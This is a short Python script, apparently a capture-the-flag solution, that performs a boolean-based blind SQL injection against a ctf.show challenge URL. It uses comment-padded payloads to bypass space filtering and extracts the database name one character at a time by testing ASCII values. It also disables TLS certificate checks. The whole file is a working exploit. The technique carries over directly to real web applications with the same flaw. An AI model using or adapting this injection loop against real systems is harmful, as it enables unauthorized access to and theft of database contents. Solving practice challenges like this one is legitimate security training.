import requests
import warnings
warnings.filterwarnings("ignore")
word=""
num=0
url = "https://a71959e2-2471-42b2-893e-220d4132217a.challenge.ctf.show/index.php?id=0/**/or/**/"
for num1 in range(1,8):
    for num2 in range (47,123):
        data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
        result = requests.get(url + data,verify=False)
        if "If" in result.text:
            word+=chr(num2)
            print(num2)
            print(word)
            break
        else:
            pass